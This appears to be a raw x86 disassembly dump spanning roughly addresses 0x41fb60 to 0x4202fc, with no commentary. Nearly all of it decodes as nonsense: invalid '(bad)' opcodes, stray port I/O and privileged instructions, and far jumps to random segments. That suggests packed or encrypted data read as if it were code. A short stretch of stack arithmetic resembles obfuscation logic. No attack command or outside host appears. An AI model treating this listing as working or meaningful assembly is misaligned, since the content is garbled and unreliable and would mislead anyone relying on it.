  41fb60:	call   0x3a6c:0xfcba9196
  41fb67:	push   ebx
  41fb68:	lods   al,BYTE PTR ds:[esi]
  41fb69:	fild   WORD PTR [ecx+0x50d6f279]
  41fb6f:	cmp    esp,DWORD PTR [edx]
  41fb71:	int    0x93
  41fb73:	pop    ss
  41fb74:	mov    DWORD PTR [edi-0x336c7a3],ebx
  41fb7a:	jle    0x41fb19
  41fb7c:	ret    
  41fb7d:	push   esp
  41fb7e:	mov    bl,0x9d
  41fb80:	ret    0x3cfe
  41fb83:	push   esp
  41fb84:	ins    DWORD PTR es:[edi],dx
  41fb85:	fist   WORD PTR ds:0xacb475f3
  41fb8b:	sbb    DWORD PTR [edi],esp
  41fb8d:	xchg   BYTE PTR [eax+0x7ca41a85],al
  41fb93:	aam    0x1c
  41fb95:	loop   0x41fb77
  41fb97:	xchg   edx,eax
  41fb98:	retf   
  41fb99:	mov    edi,0xd33c599
  41fb9e:	and    eax,0xe17df695
  41fba3:	pop    ebx
  41fba4:	push   edx
  41fba5:	inc    esp
  41fba6:	(bad)  
  41fba7:	dec    edi
  41fba8:	aam    0x5f
  41fbaa:	popa   
  41fbab:	dec    ebp
  41fbac:	mov    BYTE PTR [edi+0x2380193c],bh
  41fbb2:	jmp    0x93c53ece
  41fbb7:	inc    ebp
  41fbb8:	fnsave [ebx+ebx*1-0x76c3e7f]
  41fbbf:	add    BYTE PTR fs:[ebx],cl
  41fbc2:	retf   0x4d89
  41fbc5:	lods   al,BYTE PTR ds:[esi]
  41fbc6:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbc9:	mov    edx,DWORD PTR [ebp-0x50]
  41fbcc:	add    ecx,0x242ebcc
  41fbd2:	xor    ecx,edx
  41fbd4:	mov    DWORD PTR [ebp-0x50],ecx
  41fbd7:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbda:	mov    edx,DWORD PTR [ebp-0x4c]
  41fbdd:	add    ecx,edi
  41fbdf:	and    ecx,edx
  41fbe1:	mov    DWORD PTR [ebp-0x4c],ecx
  41fbe4:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbe7:	mov    edx,DWORD PTR [ebp-0x48]
  41fbea:	lea    ecx,[edx+ecx*1+0x241fcde]
  41fbf1:	mov    DWORD PTR [ebp-0x48],ecx
  41fbf4:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbf7:	mov    edx,0xfa5e1521
  41fbfc:	sub    edx,ecx
  41fbfe:	add    edx,DWORD PTR [ebp-0x44]
  41fc01:	mov    DWORD PTR [ebp-0x44],edx
  41fc04:	mov    ecx,DWORD PTR [ebp+0x8]
  41fc07:	jmp    0x421f6a
  41fc0c:	loope  0x41fbd6
  41fc0e:	xchg   ecx,eax
  41fc0f:	xchg   DWORD PTR [ebx-0x79],edi
  41fc12:	fisttp DWORD PTR [eax+0x539e7a01]
  41fc18:	aad    0x3d
  41fc1a:	retf   
  41fc1b:	add    BYTE PTR [ebx-0x49],0x7d
  41fc1f:	jp     0x41fc51
  41fc21:	pop    edi
  41fc22:	jp     0x41fc9e
  41fc24:	sar    BYTE PTR [ebp+0x7a],1
  41fc27:	mov    edx,0x705c582
  41fc2c:	sbb    ebp,ecx
  41fc2e:	inc    edx
  41fc2f:	je     0x41fc70
  41fc31:	cs jns 0x41fc3e
  41fc34:	inc    eax
  41fc35:	hlt    
  41fc36:	and    BYTE PTR [ecx+0x1ccc9b57],0x6d
  41fc3d:	push   eax
  41fc3e:	gs adc al,0x78
  41fc41:	sub    cl,BYTE PTR [eax-0x68411495]
  41fc47:	jb     0x41fc53
  41fc49:	sbb    bh,BYTE PTR [esi+0x3fc1259b]
  41fc4f:	push   ecx
  41fc50:	repz or dl,ah
  41fc53:	mov    ss:0x752288aa,al
  41fc59:	ret    
  41fc5a:	cmp    DWORD PTR [esi-0x584a87b3],ecx
  41fc60:	imul   esi,DWORD PTR [edx-0x35],0x3c34bdd3
  41fc67:	push   edx
  41fc68:	dec    ecx
  41fc69:	aad    0xa0
  41fc6b:	call   0x8afb9856
  41fc70:	jmp    0x41fc97
  41fc72:	(bad)  
  41fc73:	xor    DWORD PTR [esp+ecx*1+0x23e8785b],eax
  41fc7a:	and    al,0x66
  41fc7c:	fwait
  41fc7d:	adc    edi,DWORD PTR [esi]
  41fc7f:	in     eax,dx
  41fc80:	add    esi,ebx
  41fc82:	xor    BYTE PTR [edx],0xff
  41fc85:	je     0x41fcad
  41fc87:	sbb    dh,cl
  41fc89:	pop    ecx
  41fc8a:	rcr    DWORD PTR [edi+0xa2d3482],1
  41fc90:	scas   eax,DWORD PTR es:[edi]
  41fc91:	pop    edi
  41fc92:	inc    edi
  41fc93:	cmp    ebx,edx
  41fc95:	inc    eax
  41fc96:	xchg   esi,eax
  41fc97:	cmp    eax,0xfef8526a
  41fc9c:	add    DWORD PTR [edx+0x142556f1],ecx
  41fca2:	xor    ch,BYTE PTR [ebx+ebp*8]
  41fca5:	push   ss
  41fca6:	cmp    DWORD PTR [ebx-0x7a696e83],edi
  41fcac:	mov    eax,ds:0xd4a78cd6
  41fcb1:	xchg   esi,eax
  41fcb2:	xor    ebp,DWORD PTR [esi]
  41fcb4:	mov    ds:0x63c4709d,eax
  41fcb9:	(bad)  
  41fcbb:	fild   WORD PTR [esi+0x2b766cca]
  41fcc1:	and    BYTE PTR gs:[ecx],al
  41fcc4:	cli    
  41fcc5:	xchg   ebx,eax
  41fcc6:	mov    esi,0xc22a2166
  41fccb:	xchg   ecx,eax
  41fccc:	in     eax,0x64
  41fcce:	arpl   WORD PTR [esi],di
  41fcd0:	mov    cl,0x48
  41fcd2:	inc    eax
  41fcd3:	dec    edx
  41fcd4:	pop    edx
  41fcd5:	dec    esi
  41fcd6:	xor    esi,DWORD PTR [ebp+eax*2-0x538f6f98]
  41fcdd:	xchg   esi,eax
  41fcde:	dec    edx
  41fce0:	inc    esi
  41fce1:	ins    DWORD PTR es:[edi],dx
  41fce2:	in     al,dx
  41fce3:	idiv   BYTE PTR ss:[ebx]
  41fce6:	inc    esp
  41fce7:	fs clc 
  41fce9:	loopne 0x41fd24
  41fceb:	pop    esi
  41fcec:	cmp    eax,0x401534c0
  41fcf1:	inc    edx
  41fcf2:	mov    eax,?
  41fcf4:	and    al,0xe3
  41fcf6:	cmp    bl,BYTE PTR [esi-0x16]
  41fcf9:	repz scas eax,DWORD PTR es:[edi]
  41fcfb:	xor    DWORD PTR [eax-0x1ca02790],edx
  41fd01:	aaa    
  41fd02:	ins    BYTE PTR es:[edi],dx
  41fd03:	cli    
  41fd04:	sti    
  41fd05:	pop    edi
  41fd06:	pop    eax
  41fd07:	int    0xa7
  41fd09:	fwait
  41fd0a:	sub    eax,0x8057e8ea
  41fd0f:	push   ds
  41fd10:	mov    eax,ds:0x3f1c183f
  41fd15:	sbb    al,0xc2
  41fd17:	push   cs
  41fd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd19:	sbb    dl,BYTE PTR [eax+0x6d6a502a]
  41fd1f:	xchg   esp,eax
  41fd20:	fsub   DWORD PTR [edx]
  41fd22:	cmp    DWORD PTR [edi],edx
  41fd24:	jmpw   0xd5af
  41fd28:	in     eax,dx
  41fd29:	daa    
  41fd2a:	or     DWORD PTR [eax+ebp*2+0x0],edx
  41fd2e:	dec    esi
  41fd2f:	imul   edi,DWORD PTR [edx+0x68],0x5e
  41fd33:	fdiv   DWORD PTR [esi]
  41fd35:	jo     0x41fd27
  41fd37:	scas   eax,DWORD PTR es:[edi]
  41fd38:	mov    bh,0x7
  41fd3a:	jnp    0x41fccb
  41fd3c:	lods   al,BYTE PTR ds:[esi]
  41fd3d:	inc    edi
  41fd3e:	int    0x7f
  41fd40:	sti    
  41fd41:	jo     0x41fd50
  41fd43:	jo     0x41fd51
  41fd45:	pop    ss
  41fd46:	out    0x29,al
  41fd48:	(bad)  
  41fd49:	cmp    ecx,DWORD PTR [ebx-0x1d]
  41fd4c:	sbb    BYTE PTR [edi+0x50],dh
  41fd4f:	and    eax,DWORD PTR [ecx+0x49884809]
  41fd55:	out    0x29,eax
  41fd57:	lea    edi,[esi-0x35122333]
  41fd5d:	mov    eax,0xd4576c8b
  41fd62:	test   eax,0xdd35fd6d
  41fd67:	pop    eax
  41fd68:	maxps  xmm4,XMMWORD PTR [eax]
  41fd6b:	mov    ch,0x31
  41fd6d:	inc    esi
  41fd6e:	fs aaa 
  41fd70:	adc    BYTE PTR [ebx+0x496ca056],dl
  41fd76:	jle    0x41fdba
  41fd78:	hlt    
  41fd79:	and    eax,0x4fc01060
  41fd7e:	inc    esi
  41fd7f:	and    ebx,edi
  41fd81:	adc    ch,BYTE PTR [esi+0x5b]
  41fd84:	pop    ds
  41fd85:	and    esp,DWORD PTR [ecx]
  41fd87:	mov    al,ds:0x1e4d561d
  41fd8c:	push   ss
  41fd8d:	pop    ds
  41fd8e:	test   BYTE PTR [edi],ch
  41fd90:	add    ecx,DWORD PTR [ebp+0x76]
  41fd93:	xor    BYTE PTR [edx+0x2a88efd1],bl
  41fd99:	not    BYTE PTR [edi+0x45575335]
  41fd9f:	xlat   BYTE PTR ds:[ebx]
  41fda0:	jle    0x41fd32
  41fda2:	mov    bh,0xa9
  41fda4:	into   
  41fda5:	cmc    
  41fda6:	inc    eax
  41fda7:	rcl    DWORD PTR fs:[esi+ecx*2],0x36
  41fdac:	fmul   DWORD PTR [ecx-0x50]
  41fdaf:	mov    bl,0x52
  41fdb1:	sbb    BYTE PTR [eax-0x1b],ch
  41fdb4:	das    
  41fdb5:	fidivr DWORD PTR [edx]
  41fdb7:	sar    BYTE PTR [ebp-0x44],cl
  41fdba:	dec    BYTE PTR [esi]
  41fdbc:	xchg   BYTE PTR [eax],dl
  41fdbe:	mov    cl,0xf5
  41fdc0:	mov    dl,0x46
  41fdc2:	jbe    0x41fdec
  41fdc4:	ja     0x41fdfc
  41fdc6:	ret    0xd22b
  41fdc9:	leave  
  41fdca:	inc    ebp
  41fdcb:	repnz mov ds:0xb506a538,eax
  41fdd1:	xchg   DWORD PTR [edx-0x75],esp
  41fdd4:	sbb    bh,BYTE PTR [edi-0x17]
  41fdd7:	mov    esi,0x484bf12f
  41fddc:	pop    ebx
  41fddd:	jg     0x41fddc
  41fddf:	aaa    
  41fde0:	lods   eax,DWORD PTR ds:[esi]
  41fde1:	dec    edx
  41fde2:	pop    eax
  41fde3:	int3   
  41fde4:	inc    ecx
  41fde5:	xchg   esp,eax
  41fde6:	mov    dh,0x30
  41fde8:	mov    cl,0x54
  41fdea:	cmp    dh,BYTE PTR [edi-0x2d893a5a]
  41fdf0:	cmp    eax,0xf37358ae
  41fdf5:	out    0xe1,eax
  41fdf7:	icebp  
  41fdf8:	jge    0x41fe29
  41fdfa:	dec    edx
  41fdfb:	cmp    eax,0x1b27edbc
  41fe00:	and    BYTE PTR [edi+0x1e39204],0x2d
  41fe07:	rol    BYTE PTR [ebx+0x4e0ceb98],cl
  41fe0d:	jmp    0x7c94:0xcf1f3902
  41fe14:	fwait
  41fe15:	cmp    BYTE PTR [ecx],al
  41fe17:	out    dx,eax
  41fe18:	jmp    0xc809:0xb5f6918d
  41fe1f:	sbb    eax,0xe5884b42
  41fe24:	and    ecx,DWORD PTR [ecx-0x64ed37a4]
  41fe2a:	jbe    0x41fdc1
  41fe2c:	pop    ds
  41fe2d:	sub    edx,esp
  41fe2f:	mov    ebp,0x6ac02946
  41fe34:	jp     0x41feb2
  41fe36:	or     BYTE PTR [eax],al
  41fe38:	sbb    BYTE PTR [eax+ecx*2-0x250b198a],bh
  41fe3f:	std    
  41fe40:	loop   0x41fe26
  41fe42:	shl    DWORD PTR [eax-0x6f],0x58
  41fe46:	push   ebx
  41fe47:	push   cs
  41fe48:	test   al,0x52
  41fe4a:	pop    eax
  41fe4b:	fwait
  41fe4c:	mov    eax,0x81e9e510
  41fe51:	sbb    ch,BYTE PTR ds:0xce229570
  41fe57:	mov    bl,dl
  41fe59:	cmp    dh,ch
  41fe5b:	repnz es adc eax,0xc4c6afae
  41fe62:	lahf   
  41fe63:	(bad)  
  41fe64:	sub    bh,BYTE PTR [ebp+eiz*4-0x4cbeb24a]
  41fe6b:	inc    edx
  41fe6c:	inc    esi
  41fe6d:	fmul   st(1),st
  41fe6f:	and    BYTE PTR [edi],cl
  41fe71:	repz out dx,eax
  41fe73:	(bad)  [eax]
  41fe75:	shr    DWORD PTR [edx+0x39],cl
  41fe78:	sub    BYTE PTR [ecx-0x5711229],ah
  41fe7e:	or     DWORD PTR [ebp+0x5f],esp
  41fe81:	push   0xe2b79637
  41fe86:	pop    edx
  41fe87:	cmp    eax,ecx
  41fe89:	mov    esi,0x3b171250
  41fe8e:	mov    ebp,0xf7fa3672
  41fe93:	and    al,BYTE PTR [edi-0x52]
  41fe96:	bound  ebp,QWORD PTR [edi+0xd]
  41fe99:	dec    esi
  41fe9a:	fcmovnbe st,st(1)
  41fe9c:	adc    eax,0xc90df136
  41fea1:	pop    ds
  41fea2:	cmp    al,0x54
  41fea4:	or     bl,al
  41fea6:	test   BYTE PTR [ebx],cl
  41fea8:	jae    0x41fead
  41feaa:	jle    0x41ff07
  41feac:	ror    ecx,0x18
  41feaf:	ins    BYTE PTR es:[edi],dx
  41feb0:	pop    edx
  41feb1:	or     BYTE PTR [esi-0x73],0x7a
  41feb5:	xchg   BYTE PTR [eax+0x14949670],ch
  41febb:	xchg   ecx,eax
  41febc:	imul   esi,esi,0x323d1cb4
  41fec2:	pop    edx
  41fec3:	adc    ebp,DWORD PTR [ebx-0x4b]
  41fec6:	daa    
  41fec7:	push   cs
  41fec8:	shr    BYTE PTR ds:0x76bcace8,cl
  41fece:	inc    edx
  41fecf:	imul   ebp,DWORD PTR [ebp+0x55],0x7f
  41fed3:	mov    BYTE PTR [esi+0x74],ah
  41fed6:	add    al,0x6f
  41fed8:	xor    eax,DWORD PTR [esi+0x69]
  41fedb:	fwait
  41fedc:	xchg   edx,eax
  41fedd:	mov    edi,0x6cbe7ce
  41fee2:	xchg   ebp,eax
  41fee3:	inc    edi
  41fee4:	add    eax,0x1abefc01
  41fee9:	cld    
  41feea:	and    BYTE PTR [ebp+0xcc4559e],0xa3
  41fef1:	addr16 ror bl,1
  41fef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef5:	and    DWORD PTR gs:[ebx-0x26],ebp
  41fef9:	repz rol bh,1
  41fefc:	mov    ds:0x3cdc15cf,al
  41ff01:	(bad)  
  41ff02:	adc    DWORD PTR [edi-0x48edf39f],edi
  41ff08:	lock jge 0x41ff2d
  41ff0b:	sahf   
  41ff0c:	int3   
  41ff0d:	cmp    eax,0xcb49488f
  41ff12:	add    ah,BYTE PTR [eax-0x7b]
  41ff15:	mov    BYTE PTR [esi-0x4a],al
  41ff18:	mov    eax,0xe9b81722
  41ff1d:	mov    edi,0xf565313d
  41ff22:	push   0xae5bc8e3
  41ff27:	sar    BYTE PTR [eax],1
  41ff29:	mov    dl,0xf5
  41ff2b:	std    
  41ff2c:	enter  0x4689,0xfe
  41ff30:	mov    ds:0x70863c3b,al
  41ff35:	or     al,0xcd
  41ff37:	bound  eax,QWORD PTR [ebp-0x25]
  41ff3a:	pop    ecx
  41ff3b:	out    0xea,al
  41ff3d:	inc    ebp
  41ff3e:	popa   
  41ff3f:	lea    esp,ds:0x4e2a627e
  41ff45:	sub    al,0xa3
  41ff47:	popa   
  41ff48:	sti    
  41ff49:	xchg   esp,eax
  41ff4a:	(bad)  
  41ff4b:	mov    WORD PTR [eax],es
  41ff4d:	test   eax,0xd75ddf37
  41ff52:	aaa    
  41ff53:	fisubr DWORD PTR [edx-0x366fba2e]
  41ff59:	retf   0xb6bc
  41ff5c:	fmul   QWORD PTR [edi+0x7dcc6c11]
  41ff62:	jnp    0x41feee
  41ff64:	adc    al,0x1c
  41ff66:	dec    ebx
  41ff67:	leave  
  41ff68:	pop    esp
  41ff69:	aaa    
  41ff6a:	push   0xf5d7d93d
  41ff6f:	push   esp
  41ff70:	test   al,0xc5
  41ff72:	pop    edx
  41ff74:	mov    esp,DWORD PTR [esi]
  41ff76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff77:	out    dx,eax
  41ff78:	arpl   cx,sp
  41ff7a:	addr16 inc esi
  41ff7c:	jae    0x41ffe2
  41ff7e:	iret   
  41ff7f:	cmp    edi,DWORD PTR [eax+0x264d95ae]
  41ff85:	pushf  
  41ff86:	ins    DWORD PTR es:[edi],dx
  41ff87:	pop    ebx
  41ff88:	js     0x41ff52
  41ff8a:	lock cmc 
  41ff8c:	(bad)  
  41ff8d:	bound  ebx,QWORD PTR [ecx+0x26]
  41ff90:	add    bh,bh
  41ff92:	inc    ebx
  41ff93:	hlt    
  41ff94:	inc    ecx
  41ff95:	mov    edx,0xbed5f868
  41ff9a:	push   0x1c
  41ff9c:	jle    0x41ff9a
  41ff9e:	mov    bh,0xf7
  41ffa0:	(bad)  
  41ffa1:	out    dx,al
  41ffa2:	test   BYTE PTR [edi],cl
  41ffa4:	mov    cl,0x16
  41ffa6:	add    eax,0x21cb0881
  41ffab:	add    al,0x6b
  41ffad:	ror    bh,0xcc
  41ffb0:	pop    esp
  41ffb1:	mov    esi,0xf2bad3a1
  41ffb6:	aad    0xee
  41ffb8:	dec    ecx
  41ffb9:	mov    ds:0x2add1250,al
  41ffbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffbf:	pop    ebx
  41ffc0:	adc    DWORD PTR [ebx+0x347241dc],edi
  41ffc6:	arpl   WORD PTR [edx+0x30],dx
  41ffc9:	jg     0x420018
  41ffcb:	dec    ecx
  41ffcc:	sbb    cl,BYTE PTR [edi+edx*1]
  41ffcf:	sub    al,0x4f
  41ffd1:	int    0xe8
  41ffd3:	je     0x41ffe1
  41ffd5:	xchg   BYTE PTR [edi-0x22],bl
  41ffd8:	pushf  
  41ffd9:	cmp    al,0x98
  41ffdb:	ret    
  41ffdc:	xchg   edx,eax
  41ffdd:	mov    al,ds:0xb1f9b3f3
  41ffe2:	bound  esp,QWORD PTR [esi]
  41ffe4:	sub    BYTE PTR [edi-0x11],ch
  41ffe7:	loop   0x420019
  41ffe9:	sub    dl,BYTE PTR [esi+ebp*2]
  41ffec:	mov    dh,0x65
  41ffee:	cmp    al,0xbd
  41fff0:	jge    0x41ffc4
  41fff2:	jge    0x41ff94
  41fff4:	test   bh,ch
  41fff6:	sbb    cl,al
  41fff8:	jb     0x41ffe6
  41fffa:	bound  edx,QWORD PTR [ebx]
  41fffc:	mov    ds:0x692a7bda,al
  420001:	jge    0x42003b
  420003:	inc    edi
  420004:	rcl    DWORD PTR [ebx],0x81
  420007:	mov    dh,BYTE PTR [ebp-0x2cd873f4]
  42000d:	stc    
  42000e:	scas   al,BYTE PTR es:[edi]
  42000f:	jmp    0x5a51e4ef
  420014:	aas    
  420015:	or     edx,esi
  420017:	repz or eax,DWORD PTR [ebx+0x2f]
  42001b:	into   
  42001c:	add    al,0x90
  42001e:	push   ebp
  42001f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420020:	xchg   ebx,eax
  420021:	into   
  420022:	aaa    
  420023:	sub    ebp,DWORD PTR [ecx]
  420025:	test   DWORD PTR [edx+0x68],eax
  420028:	or     bh,BYTE PTR [ebp+0x45418a6f]
  42002e:	xor    eax,0x3c589e24
  420033:	sub    eax,0x69c80408
  420038:	sahf   
  420039:	jl     0x4200aa
  42003b:	push   ecx
  42003c:	ja     0x420054
  42003e:	mov    dh,dh
  420040:	push   es
  420041:	add    DWORD PTR [ebx+0x49],esi
  420044:	outs   dx,BYTE PTR ds:[esi]
  420045:	pop    esp
  420046:	lea    ebp,ds:0x3525094e
  42004c:	stos   BYTE PTR es:[edi],al
  42004d:	call   0x16b46276
  420052:	sti    
  420053:	mov    dl,bl
  420055:	xlat   BYTE PTR ds:[ebx]
  420056:	sbb    eax,0xfd8f490
  42005b:	cs xor bh,ch
  42005e:	std    
  42005f:	outs   dx,BYTE PTR ds:[esi]
  420060:	mov    esp,0x9b87be9e
  420065:	iret   
  420066:	lock jl 0x420068
  420069:	xchg   DWORD PTR fs:[ecx-0x3],ebx
  42006d:	xor    eax,0xeb922c3
  420072:	ja     0x420057
  420074:	and    al,0x49
  420076:	xchg   esi,eax
  420077:	cs mov bl,0x6f
  42007a:	inc    esi
  42007b:	cld    
  42007c:	xor    DWORD PTR [ebp-0x356248dc],eax
  420082:	gs popa 
  420084:	sbb    DWORD PTR [edi-0x1ddb405b],esp
  42008a:	or     al,BYTE PTR [edi]
  42008c:	and    eax,0x2af1ecad
  420091:	std    
  420092:	mov    ah,0x9f
  420094:	dec    eax
  420095:	jno    0x4200d1
  420097:	rcr    bl,0x2
  42009a:	loop   0x4200a3
  42009c:	nop
  42009d:	call   0x9f379329
  4200a2:	mov    bh,0x31
  4200a4:	test   al,0xda
  4200a6:	or     al,0xa
  4200a8:	adc    dl,0xb4
  4200ab:	jmp    0x42005d
  4200ad:	push   0x5d
  4200af:	out    0xd,al
  4200b1:	aas    
  4200b2:	xchg   ebp,eax
  4200b3:	mov    bh,0xa8
  4200b5:	push   0xffffff9b
  4200b7:	ror    BYTE PTR [eax],0x65
  4200ba:	inc    esi
  4200bb:	pop    ebp
  4200bc:	xor    ecx,edi
  4200be:	xlat   BYTE PTR ds:[ebx]
  4200bf:	pmaxub mm6,mm6
  4200c2:	mov    fs,WORD PTR [edx+0x4b5d1a10]
  4200c8:	je     0x4200a6
  4200ca:	clc    
  4200cb:	adc    esi,DWORD PTR es:[ebp-0x9]
  4200cf:	mov    ch,0x43
  4200d1:	push   ecx
  4200d2:	cwde   
  4200d3:	adc    DWORD PTR [edi-0x5a],0x87c84967
  4200da:	mov    al,ds:0xbf02c547
  4200df:	jmp    0x42013e
  4200e1:	pop    esi
  4200e2:	dec    ecx
  4200e3:	sbb    DWORD PTR [edi+ebp*2],ecx
  4200e6:	cli    
  4200e7:	xor    DWORD PTR [ebx-0x34],0xde144a4b
  4200ee:	arpl   WORD PTR [ebx],ax
  4200f0:	dec    esi
  4200f1:	out    0x19,eax
  4200f3:	int3   
  4200f4:	lock mov al,BYTE PTR [ebp+edx*1+0x40]
  4200f9:	push   esp
  4200fa:	pop    esp
  4200fb:	retf   
  4200fc:	cdq    
  4200fd:	jmp    0xadff2f62
  420102:	in     eax,0xfa
  420104:	xor    eax,0x257cb5ed
  420109:	mov    ebx,0xc9936be6
  42010e:	sbb    esi,DWORD PTR [ebx-0x1751a073]
  420114:	inc    ebp
  420115:	out    dx,eax
  420116:	div    BYTE PTR ds:0x1060093c
  42011c:	sar    DWORD PTR [esi+0x7f],cl
  42011f:	(bad)  
  420120:	fmul   st,st(4)
  420122:	xchg   ebp,eax
  420123:	(bad)  
  420124:	sti    
  420125:	nop
  420126:	sub    al,0x3a
  420128:	jge    0x4200c4
  42012a:	add    BYTE PTR [edx-0x4d0e76e1],dh
  420130:	add    BYTE PTR [esi-0x35],bh
  420133:	popf   
  420134:	add    BYTE PTR [edx+ebx*4],bh
  420137:	sbb    al,0x9b
  420139:	mov    al,ds:0xfa0d6ac0
  42013e:	les    ecx,FWORD PTR [edi+0x1c]
  420141:	add    BYTE PTR gs:[edx-0x7],0xfc
  420146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420147:	les    ebx,FWORD PTR [ebx+0x25dfb9e9]
  42014d:	push   0x1c275546
  420152:	push   ebp
  420153:	mov    dh,0x3f
  420155:	sbb    eax,0xd832ea39
  42015a:	add    eax,0x2d788973
  42015f:	scas   al,BYTE PTR es:[edi]
  420160:	xor    cl,BYTE PTR [eax-0x3f]
  420163:	je     0x420123
  420165:	dec    esp
  420166:	ss dec ecx
  420168:	mov    dh,0x8c
  42016a:	add    eax,0xbff265db
  42016f:	cmp    al,0xe7
  420171:	xor    DWORD PTR [edx],esi
  420173:	sbb    ecx,DWORD PTR [esi+0x1f]
  420176:	lea    ebp,[esi]
  420178:	sahf   
  420179:	inc    edi
  42017a:	mov    ebp,0x9953298d
  42017f:	xor    al,0x0
  420181:	mov    dl,0xdb
  420183:	call   0xe40a:0x1ab40fdf
  42018a:	mov    ss,WORD PTR [edi+0x44]
  42018d:	xchg   ebp,eax
  42018e:	add    al,0x9e
  420190:	fldenv [edx-0x5e]
  420193:	jb     0x4201e6
  420195:	arpl   WORD PTR [ebp+0x73],bx
  420198:	and    DWORD PTR ds:[edi+ecx*8+0x44],esi
  42019d:	aaa    
  42019e:	mov    esi,0x18f9776b
  4201a3:	add    ecx,DWORD PTR [edi-0x10c1dcf5]
  4201a9:	mov    edi,0xd123673a
  4201ae:	xor    BYTE PTR [ecx*8+0x4ea86e4d],0x33
  4201b6:	pop    ebx
  4201b7:	in     al,dx
  4201b8:	mov    eax,ds:0x29631123
  4201bd:	and    BYTE PTR [ebp-0x6ac212fd],0x62
  4201c4:	mov    esi,?
  4201c6:	rcl    BYTE PTR [edi-0x1a],1
  4201c9:	data16 xor BYTE PTR [edx],0xb7
  4201cd:	sbb    al,0xed
  4201cf:	out    0xc,eax
  4201d1:	int3   
  4201d2:	or     dl,BYTE PTR [ebp-0x6d]
  4201d5:	rol    esi,0xad
  4201d8:	push   ss
  4201d9:	pop    edx
  4201da:	xor    DWORD PTR [esi],eax
  4201dc:	and    BYTE PTR [ecx-0x60],ah
  4201df:	hlt    
  4201e0:	dec    ebx
  4201e1:	xchg   edx,eax
  4201e2:	ror    DWORD PTR [edi-0x7d69a48f],cl
  4201e8:	ret    0x12d1
  4201eb:	lds    ebp,FWORD PTR [ebx-0x3f8ddec3]
  4201f1:	sbb    dl,al
  4201f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201f4:	stos   DWORD PTR es:[edi],eax
  4201f5:	push   esp
  4201f6:	add    ebp,eax
  4201f8:	inc    esp
  4201f9:	jp     0x420263
  4201fb:	jbe    0x420239
  4201fd:	or     dl,cl
  4201ff:	stos   BYTE PTR es:[edi],al
  420200:	retf   
  420201:	or     edi,DWORD PTR [ecx+0x5]
  420204:	sub    DWORD PTR [edi+edx*4],0x20823931
  42020b:	stc    
  42020c:	rcr    DWORD PTR ds:0x754d1235,1
  420212:	adc    DWORD PTR ds:0x79692226,esp
  420218:	sbb    ebp,ebp
  42021a:	clc    
  42021b:	sub    BYTE PTR [ecx],dh
  42021d:	jne    0x420289
  42021f:	gs sbb dh,al
  420222:	adc    DWORD PTR [eax],esp
  420224:	je     0x4201db
  420226:	aaa    
  420227:	stos   BYTE PTR es:[edi],al
  420228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420229:	jns    0x420236
  42022b:	lea    ebp,[esi+0x226febb]
  420231:	xchg   edx,eax
  420232:	jmp    0x420229
  420234:	mov    dh,BYTE PTR [edi-0x541eb325]
  42023a:	mov    ds:0xf5e69fcf,al
  42023f:	int    0x93
  420241:	call   0xbedf39fb
  420246:	sub    eax,0xf1f343aa
  42024b:	fidivr DWORD PTR [edi+0x71]
  42024e:	dec    esi
  42024f:	adc    BYTE PTR [esi+0x7e],ah
  420252:	xor    eax,0x5cc1021f
  420257:	lea    eax,[esi]
  420259:	jb     0x420284
  42025b:	add    esi,DWORD PTR [edx+eax*8]
  42025e:	pop    ds
  42025f:	push   ebp
  420260:	sbb    edi,ebp
  420262:	mov    ah,0xe4
  420264:	scas   eax,DWORD PTR es:[edi]
  420265:	xchg   ebp,eax
  420266:	pop    edx
  420267:	xor    DWORD PTR [eax-0x78],ebx
  42026a:	repnz lahf 
  42026c:	sbb    edi,0xffffff87
  42026f:	jb     0x420276
  420271:	lods   eax,DWORD PTR ds:[esi]
  420272:	mov    WORD PTR es:[esi-0x61dd29cd],?
  420279:	std    
  42027a:	cwde   
  42027b:	jle    0x4202e2
  42027d:	mov    ebp,0xbca81414
  420282:	outs   dx,DWORD PTR ds:[esi]
  420283:	pop    ss
  420284:	mov    BYTE PTR [eax+0x3bdd6442],dh
  42028a:	xchg   esp,eax
  42028b:	sbb    al,0x8f
  42028d:	jmp    0x4202b4
  42028f:	jle    0x42029b
  420291:	fisub  WORD PTR [ebx-0x52]
  420294:	shl    BYTE PTR [ebx+0x74e11c49],cl
  42029a:	cmp    BYTE PTR [ecx-0x66],dl
  42029d:	fs jae 0x420264
  4202a0:	mov    eax,ds:0x166c48f
  4202a5:	xchg   ecx,eax
  4202a6:	(bad)  
  4202a7:	icebp  
  4202a8:	dec    edi
  4202a9:	js     0x42025f
  4202ab:	retf   
  4202ac:	int    0x44
  4202ae:	mov    BYTE PTR [edi+ecx*4-0xdcfc1f9],0x37
  4202b6:	stc    
  4202b7:	and    al,0xda
  4202b9:	mov    bh,0x9d
  4202bb:	push   esp
  4202bc:	add    BYTE PTR [eax],bl
  4202be:	imul   esp,DWORD PTR [esi],0x51
  4202c1:	xor    al,0x3c
  4202c3:	mov    al,ds:0xea266d09
  4202c8:	jns    0x420308
  4202ca:	or     al,0xfa
  4202cd:	sahf   
  4202ce:	dec    eax
  4202cf:	xor    ebx,DWORD PTR [eax+ebx*8]
  4202d2:	(bad)  
  4202d3:	fsub   DWORD PTR [eax-0x16]
  4202d6:	std    
  4202d7:	adc    edx,edx
  4202d9:	xor    eax,0xc322e2c2
  4202de:	adc    dh,dl
  4202e0:	xor    ecx,0x3f
  4202e3:	fistp  WORD PTR [ecx]
  4202e5:	jo     0x420292
  4202e7:	mov    eax,0xa2bfb271
  4202ec:	push   esp
  4202ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ee:	inc    edi
  4202ef:	es mov edi,0x6eb26b33
  4202f5:	mov    eax,0xb30403e3
  4202fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202fb:	ret    
  4202fc:	pop    edx
